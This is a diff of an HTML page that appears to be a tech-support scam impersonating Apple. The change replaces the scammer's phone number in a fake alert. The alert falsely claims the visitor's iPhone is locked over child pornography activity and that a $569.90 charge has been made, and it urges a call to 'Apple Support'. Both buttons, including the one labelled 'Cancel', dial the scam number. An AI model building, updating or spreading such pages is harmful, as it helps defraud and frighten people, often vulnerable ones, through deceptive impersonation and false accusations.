@@ -70,13 +70,13 @@
                 <div class="modal-content" id="applealertmodeltwo">
                     <div class="modal-body text-center">
                         <div class="alert-text">
-                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-520-3455">+1-855-520-3455</a> to unlock it!
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-833-414-5315">+1-833-414-5315</a> to unlock it!
                         </div>
 
                         
                         <div class="text-end gap-4 mt-3 actionbtn">
-                            <a href="tel:+1-855-520-3455" class="me-2 bg-primary">Call +1-855-520-3455</a>
-                            <a href="tel:+1-855-520-3455" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                            <a href="tel:+1-833-414-5315" class="me-2 bg-primary">Call +1-833-414-5315</a>
+                            <a href="tel:+1-833-414-5315" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                         </div>
                     </div>
                 </div>
